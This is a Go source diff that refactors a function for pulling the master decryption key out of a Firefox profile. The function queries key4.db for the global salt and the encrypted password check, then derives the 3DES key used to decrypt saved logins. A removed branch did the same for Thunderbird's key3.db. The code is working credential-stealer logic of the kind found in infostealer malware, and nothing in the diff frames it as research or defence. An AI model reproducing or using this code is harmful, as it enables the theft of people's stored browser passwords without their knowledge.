@@ -305,44 +305,40 @@ func mozillaExtractSecretKey(keyData map[string]string, globalSalt string, maste
 }
 
 func getMozillaKey(profilePath string, app string) []byte{
-	if app == "FF" { // Firefox
-		db, err := sql.Open("sqlite3", profilePath+"\\key4.db")
-		if err!=nil{
+	log.Println("Read ", app)
+
+	db, err := sql.Open("sqlite3", profilePath+"\\key4.db")
+	if err!=nil{
+		return nil
+	}
+	rows, err := db.Query("SELECT item1, item2 FROM metadata WHERE id = 'password'")
+	var item1, item2 string
+
+	for rows.Next(){
+		rows.Scan(&item1, &item2)
+		var globalSalt, _, _, status = mozillaManageMasterPassword(item1, item2)
+
+		if !status {
+			// Сработает в случае использования master password для FF
 			return nil
 		}
-		rows, err := db.Query("SELECT item1, item2 FROM metadata WHERE id = 'password'")
-		var item1, item2 string
 
-		for rows.Next(){
-			rows.Scan(&item1, &item2)
-			var globalSalt, _, _, status = mozillaManageMasterPassword(item1, item2)
+		if globalSalt != ""{
+			rows2, _ := db.Query("SELECT a11,a102 FROM nssPrivate")
+			var all, a102 string
+			rows2.Next()
+			rows2.Scan(&all, &a102)
 
-			if !status {
-				// Сработает в случае использования master password для FF
-				return nil
-			}
+			var sourceData AsnSourceDataMasterPassword
+			asn1.Unmarshal([]byte(all), &sourceData)
 
-			if globalSalt != ""{
-				rows2, _ := db.Query("SELECT a11,a102 FROM nssPrivate")
-				var all, a102 string
-				rows2.Next()
-				rows2.Scan(&all, &a102)
-
-				var sourceData AsnSourceDataMasterPassword
-				asn1.Unmarshal([]byte(all), &sourceData)
-
-				var entrySalt = sourceData.Data.Data.Entry
-				var cipherT = sourceData.EncryptedPasswdCheck
-				var key = mozillaDecrypt3DES(globalSalt, "", entrySalt, cipherT)
-				return key
-			}
+			var entrySalt = sourceData.Data.Data.Entry
+			var cipherT = sourceData.EncryptedPasswdCheck
+			var key = mozillaDecrypt3DES(globalSalt, "", entrySalt, cipherT)
+			return key
 		}
-	} else if app == "TB"{ // Thunderbird
-		var key_data = mozillaReadBsdDB(profilePath+"\\key3.db")
-		var globalSalt = key_data["global-salt"]
-		var key = mozillaExtractSecretKey(key_data, globalSalt, "")
-		return key
 	}
+
 	return nil
 }
 
